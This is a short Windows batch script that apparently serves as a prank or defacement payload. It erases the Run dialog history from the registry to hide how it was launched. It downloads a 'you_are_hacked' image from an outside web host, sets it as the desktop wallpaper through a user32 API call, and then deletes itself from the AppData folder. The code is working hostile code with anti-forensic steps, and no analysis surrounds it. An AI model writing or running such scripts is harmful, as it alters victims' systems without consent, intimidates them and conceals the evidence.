@echo off
cmd /c "reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f"
for /f "tokens=2 delims=:" %%a in ('systeminfo ^| find "System Locale:"') do set locale=%%a
set locale=%locale: =%
if /I "%locale:~0,5%"=="nl-NL" (
    set startscreen=Bureaublad
) else (
    set startscreen=Desktop
)
set "dest=%USERPROFILE%\%startscreen%"
powershell -C "Invoke-WebRequest -Uri https://www.politie-bht.be/assets/images/pictures/article/s_c/300x200/hacking_1493719859.png -OutFile '%dest%\you_are_hacked.png'"
powershell -C "Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\", SetLastError = true)] public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20,0,'%dest%\you_are_hacked.png',3)"
DEL "%APPDATA%\You_are_hacked.bat"
